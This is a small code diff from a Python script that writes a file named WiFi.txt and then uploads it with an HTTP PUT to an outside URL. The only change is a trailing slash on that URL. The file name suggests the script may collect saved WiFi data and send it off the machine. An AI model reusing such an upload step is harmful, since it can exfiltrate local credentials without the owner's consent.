@@ -35,6 +35,6 @@ with open('../WiFi.txt', 'w+') as fish:
 
 
 with open('../WiFi.txt', 'rb') as fish:
-    r = requests.put("https://www.google.com", data=fish)
+    r = requests.put("https://www.google.com/", data=fish)
     if r.status_code == 200:
         print('Success')
